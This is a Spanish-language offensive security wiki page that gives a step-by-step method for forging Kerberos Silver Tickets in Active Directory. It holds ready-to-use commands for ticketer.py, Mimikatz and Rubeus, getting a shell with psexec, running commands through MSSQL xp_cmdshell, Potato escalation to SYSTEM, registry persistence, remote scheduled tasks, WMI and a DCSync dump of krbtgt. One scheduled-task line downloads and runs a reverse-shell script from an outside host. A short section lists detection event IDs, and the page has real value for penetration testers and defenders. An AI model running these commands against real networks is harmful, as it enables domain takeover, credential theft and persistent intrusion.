# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

El ataque **Silver Ticket** implica la explotación de tickets de servicio en entornos de Active Directory (AD). Este método se basa en **obtener el hash NTLM de una cuenta de servicio**, como una cuenta de equipo, para falsificar un ticket de Ticket Granting Service (TGS). Con este ticket falsificado, un atacante puede acceder a servicios específicos de la red, **suplantando a cualquier usuario**, normalmente con el objetivo de obtener privilegios administrativos. Se destaca que usar claves AES para falsificar tickets es más seguro y menos detectable.<sup>[[1]](#references)[[2]](#references)</sup>

> [!WARNING]
> Los Silver Tickets son menos detectables que los Golden Tickets porque solo requieren el **hash de la cuenta de servicio**, no el de la cuenta krbtgt. Sin embargo, se limitan al servicio específico al que apuntan. Además, basta con robar la contraseña de un usuario.
Además, si comprometes la **contraseña de una cuenta con un SPN**, puedes usarla para crear un Silver Ticket que suplante a cualquier usuario en ese servicio.

### Cambios modernos de Kerberos (dominios solo con AES)

- Las actualizaciones de Windows a partir del **8 de noviembre de 2022 (KB5021131)** configuran los tickets de servicio para que usen **claves de sesión AES** de forma predeterminada cuando sea posible y están eliminando gradualmente RC4. Se espera que, para mediados de 2026, los DC se distribuyan con RC4 **deshabilitado de forma predeterminada**, por lo que depender de hashes NTLM/RC4 para Silver Tickets falla cada vez más con `KRB_AP_ERR_MODIFIED`. Extrae siempre **claves AES** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) para la cuenta de servicio objetivo.<sup>[[5]](#references)</sup>
- Si `msDS-SupportedEncryptionTypes` de la cuenta de servicio está restringido a AES, debes falsificar el ticket con `/aes256` o `-aesKey`; RC4 (`/rc4` o `-nthash`) no funcionará, aunque tengas el hash NTLM.<sup>[[6]](#references)</sup>
- Las cuentas gMSA/de equipo cambian cada 30 días; extrae la **clave AES actual** de LSASS, Secretsdump/NTDS o DCsync antes de falsificar el ticket.
- OPSEC: la duración predeterminada de los tickets en las herramientas suele ser de **10 años**; establece duraciones realistas (p. ej., `-duration 600` minutos) para evitar la detección por duraciones anómalas.<sup>[[6]](#references)</sup>

Para crear tickets, se utilizan distintas herramientas según el sistema operativo:

### En Linux

```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```

### En Windows

```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
  /domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
  /aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
  /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```

El servicio CIFS se destaca como un objetivo común para acceder al sistema de archivos de la víctima, pero también se pueden explotar otros servicios, como HOST y RPCSS, para ejecutar tareas y consultas WMI.

### Ejemplo: servicio MSSQL (MSSQLSvc) + Potato para obtener SYSTEM

Si tienes el hash NTLM (o la clave AES) de la cuenta propietaria de un **SPN de servicio SQL registrado y exacto**, es posible que el servicio acepte un ticket de servicio falsificado. La clase de servicio y el nombre de host del ticket deben coincidir con el SPN real; no des por sentado que todas las instalaciones usan `MSSQLSvc/`. La identidad declarada también debe corresponder a un inicio de sesión de SQL con los permisos necesarios para habilitar y ejecutar `xp_cmdshell`. Los comandos `xp_cmdshell` que se ejecuten correctamente se ejecutan con la identidad del proceso del servicio SQL (o con un proxy configurado para quienes no sean sysadmin). Antes de considerar una ruta de Potato independiente, inspecciona si el **token del proceso** tiene habilitado `SeImpersonatePrivilege`; la configuración del servicio o un SPN, por sí solos, no lo demuestran.<sup>[[4]](#references)</sup>

```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
  -q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```

- Si el contexto resultante tiene SeImpersonatePrivilege (algo frecuente en cuentas de servicio), usa una variante de Potato para obtener SYSTEM:

```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```

Más detalles sobre cómo abusar de MSSQL y habilitar xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Descripción general de las técnicas Potato:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Servicios disponibles

| Tipo de servicio                          | Servicios para Silver Tickets                                                |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Según el sistema operativo, también:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>En algunos casos, puedes solicitar simplemente: WINRM</p> |
| Tareas programadas                         | HOST                                                                       |
| Windows File Share, también psexec         | CIFS                                                                       |
| Operaciones LDAP, incluido DCSync          | LDAP                                                                       |
| Herramientas de administración remota de servidores de Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Con **Rubeus** puedes **solicitar todos** estos tickets usando el parámetro:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### ID de eventos de Silver Tickets

- 4624: Inicio de sesión de cuenta
- 4634: Cierre de sesión de cuenta
- 4672: Inicio de sesión de administrador
- **La ausencia de un 4768/4769 previo en el DC** para el mismo cliente/servicio es un indicador habitual de que se presentó directamente al servicio un TGS falsificado.
- Una duración del ticket anormalmente larga o un tipo de cifrado inesperado (RC4 cuando el dominio exige AES) también destacan en los datos 4769/4624.

## Persistencia

Para evitar que las máquinas cambien su contraseña cada 30 días, establece `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` o puedes establecer `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` en un valor superior a 30 días para indicar el período de rotación de la contraseña de las máquinas.<sup>[[3]](#references)</sup>

## Abuso de tickets de servicio

En los siguientes ejemplos, imaginemos que el ticket se obtiene suplantando la cuenta de administrador.

### CIFS

Con este ticket podrás acceder a las carpetas `C$` y `ADMIN$` mediante **SMB** (si están expuestas) y copiar archivos a una parte del sistema de archivos remoto haciendo algo como:

```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```

También podrás obtener una shell dentro del host o ejecutar comandos arbitrarios usando **psexec**:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Con este permiso puedes generar tareas programadas en equipos remotos y ejecutar comandos arbitrarios:

```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```

### HOST + RPCSS

Con estos tickets puedes **ejecutar WMI en el sistema víctima**:

```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```

Encuentra **más información sobre wmiexec** en la siguiente página:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Con acceso winrm a un equipo, puedes **acceder a él** e incluso obtener una sesión de PowerShell:

```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```

Consulta la siguiente página para conocer **más formas de conectarte a un host remoto usando winrm**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Ten en cuenta que **winrm debe estar activo y escuchando** en el equipo remoto para poder acceder a él.

### LDAP

Con este privilegio puedes volcar la base de datos del DC usando **DCSync**:

```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```

**Más información sobre DCSync** en la siguiente página:


{{#ref}}
dcsync.md
{{#endref}}


## References

- [1] [Kerberos: Silver Tickets - ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [2] [Kerberos (II): ¿Cómo atacar Kerberos? - Tarlogic](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [3] [Proceso de contraseña de cuenta de equipo - Microsoft Tech Community](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [4] [HTB Sendai – 0xdf: Silver Ticket + ruta de Potato](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [5] [KB5021131: refuerzo de Kerberos y obsolescencia de RC4](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [6] [Opciones actuales de ticketer.py de Impacket (AES/keytab/duración)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)
{{#include ../../banners/hacktricks-training.md}}
